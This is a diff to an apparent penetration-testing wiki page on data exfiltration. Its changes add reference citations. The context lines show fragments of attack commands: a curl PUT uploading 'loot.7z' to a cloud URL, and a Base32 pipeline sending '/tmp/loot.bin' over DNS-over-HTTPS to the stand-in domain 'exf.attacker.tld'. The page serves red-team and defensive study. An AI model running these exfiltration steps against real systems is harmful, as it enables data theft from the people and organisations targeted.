@@ -169,13 +169,13 @@ curl -X PUT --data-binary @loot.7z \
 Notes:
 - Pre-signed URLs / SAS tokens usually scope the **path**, **HTTP method**, and **expiration**.
 - For Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` is mandatory.
-- This pattern works well with `curl`, `Invoke-WebRequest`, or any custom implant that can issue a raw HTTPS `PUT`.
+- This pattern works well with `curl`, `Invoke-WebRequest`, or any custom implant that can issue a raw HTTPS `PUT`.<sup>[[8]](#references)</sup>
 
 ### goshs
 
 [goshs](https://github.com/patrickhener/goshs) is a single-binary replacement for `python3 -m http.server` 
 with upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links, 
-and OOB collaboration features (DNS, SMTP, NTLM hash capture).
+and OOB collaboration features (DNS, SMTP, NTLM hash capture).<sup>[[4]](#references)</sup>
 
 ```bash
 # Serve current directory on port 8000
@@ -287,7 +287,7 @@ while ($true) {
 
 Notes:
 - Similar patterns apply to other collaboration platforms (Slack/Teams) using their incoming webhooks; adjust URL and JSON schema accordingly.
-- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see:
+- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see:<sup>[[7]](#references)</sup>
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -506,7 +506,7 @@ base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
   done
 ```
 
-On the authoritative DNS server for `exf.attacker.tld`, sort the queries by the numeric prefix and reconstruct the Base32 stream. This keeps the transport inside HTTPS to the resolver instead of classic UDP/53 DNS.
+On the authoritative DNS server for `exf.attacker.tld`, sort the queries by the numeric prefix and reconstruct the Base32 stream. This keeps the transport inside HTTPS to the resolver instead of classic UDP/53 DNS.<sup>[[2]](#references)</sup>
 
 For full bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, etc.), check [the tunneling page](tunneling-and-port-forwarding.md).
 
